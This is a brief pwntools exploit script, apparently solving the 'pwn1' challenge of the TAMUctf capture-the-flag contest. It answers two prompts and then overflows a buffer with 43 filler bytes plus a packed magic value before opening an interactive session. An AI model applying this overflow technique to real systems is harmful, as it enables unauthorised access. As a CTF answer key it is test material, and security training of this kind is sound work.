from pwn import *

#r = process("./pwn1")
r = remote("pwn.tamuctf.com",4321)
pause()
r.send("Sir Lancelot of Camelot\n")
r.send("To seek the Holy Grail.\n")
value = p32(0xdea110c8)
r.sendline("A"*43+value)
r.interactive()
